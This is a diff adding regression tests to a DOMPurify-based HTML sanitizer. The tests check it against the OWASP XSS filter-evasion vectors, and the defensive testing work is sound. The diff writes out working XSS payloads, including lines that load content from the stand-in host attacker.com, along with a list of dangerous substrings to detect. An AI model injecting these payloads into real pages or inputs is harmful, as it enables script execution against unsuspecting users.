@@ -91,4 +91,66 @@ describe("sanitizeHtml", () => {
   it("returns an empty string unchanged", () => {
     expect(sanitizeHtml("")).toBe("");
   });
+
+  // F-06: OWASP XSS cheat sheet vectors — ensures the DOMPurify-based
+  // sanitizer handles all known bypass patterns from the OWASP XSS
+  // Filter Evasion Cheat Sheet.
+  describe("OWASP XSS cheat sheet vectors", () => {
+    const VECTORS: [string, string][] = [
+      ["IMG onerror", `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`],
+      ["IMG dynsrc", `<IMG DYNSRC="javascript:alert('XSS')">`],
+      ["IMG lowsrc", `<IMG LOWSRC="javascript:alert('XSS')">`],
+      ["BODY onload", `<BODY ONLOAD=alert('XSS')>`],
+      ["INPUT onfocus autofocus", `<INPUT TYPE="TEXT" ONFOCUS="alert('XSS')" AUTOFOCUS>`],
+      ["MARQUEE onstart", `<MARQUEE ONSTART=alert('XSS')>`],
+      ["VIDEO onerror", `<VIDEO><SOURCE ONERROR="alert('XSS')">`],
+      ["MATH/MTEXT", `<MATH><MTEXT><!--<IMG SRC="--><IMG SRC=x onerror=alert('XSS')>//">`],
+      ["TABLE background", `<TABLE BACKGROUND="javascript:alert('XSS')">`],
+      ["DIV style expression", `<DIV STYLE="width:expression(alert('XSS'))">`],
+      ["BASE href", `<BASE HREF="javascript:alert('XSS');//">`],
+      ["OBJECT data", `<OBJECT TYPE="text/x-scriptlet" DATA="http://attacker.com/xss.html">`],
+      ["EMBED src", `<EMBED SRC="http://attacker.com/xss.swf" AllowScriptAccess="always">`],
+      [
+        "XML data island",
+        `<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`,
+      ],
+      ["META refresh", `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`],
+      ["LINK stylesheet", `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`],
+      ["STYLE import", `<STYLE>@import'http://attacker.com/xss.css';</STYLE>`],
+      ["VBScript", `<IMG SRC='vbscript:MsgBox("XSS")'>`],
+      ["HTML entity encoding", `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`],
+    ];
+
+    for (const [label, payload] of VECTORS) {
+      it(`neutralizes ${label}`, () => {
+        const out = sanitizeHtml(payload);
+        expect(out.toLowerCase()).not.toContain("alert(");
+        expect(out.toLowerCase()).not.toContain("alert'");
+        expect(out.toLowerCase()).not.toContain("javascript:");
+        expect(out.toLowerCase()).not.toContain("vbscript:");
+        expect(out.toLowerCase()).not.toContain("<script");
+        expect(out.toLowerCase()).not.toContain("onerror");
+        expect(out.toLowerCase()).not.toContain("onload");
+        expect(out.toLowerCase()).not.toContain("onfocus");
+        expect(out.toLowerCase()).not.toContain("onstart");
+        expect(out.toLowerCase()).not.toContain("ontoggle");
+        expect(out.toLowerCase()).not.toContain("expression(");
+      });
+    }
+
+    // These vectors produce inert text content (no executable elements).
+    // DOMPurify correctly prevents execution — the text survives because
+    // it is not inside any dangerous element.
+    it("neutralizes UTF-7 encoded (inert text)", () => {
+      const out = sanitizeHtml(`+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`);
+      expect(out.toLowerCase()).not.toContain("<script");
+      expect(out.toLowerCase()).not.toContain("</script");
+    });
+
+    it("neutralizes null byte injection (inert text)", () => {
+      const out = sanitizeHtml(`<scr\x00ipt>alert("XSS")</scr\x00ipt>`);
+      expect(out.toLowerCase()).not.toContain("<script");
+      expect(out.toLowerCase()).not.toContain("</script");
+    });
+  });
 });
